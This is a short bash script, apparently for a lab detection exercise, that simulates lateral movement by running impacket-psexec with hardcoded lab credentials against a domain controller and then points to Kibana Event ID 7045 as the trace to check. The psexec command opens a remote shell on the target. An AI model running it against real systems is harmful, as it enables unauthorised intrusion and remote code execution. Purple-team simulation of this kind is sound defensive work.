#!/bin/bash
# Attack Simulation: Lateral Movement via PSExec
# MITRE ATT&CK: T1021.002
# Usage: ./psexec_lateral.sh
# Requirements: impacket installed on Kali

DC_IP="192.168.50.86"
DOMAIN="lab.local"
USERNAME="labadmin"
PASSWORD="Password123!"

echo "[*] Executing PSExec lateral movement against $DC_IP"
impacket-psexec "${DOMAIN}/${USERNAME}:${PASSWORD}@${DC_IP}"

echo "[*] Attack complete - check Kibana for Event ID 7045 with random service name in %systemroot%"
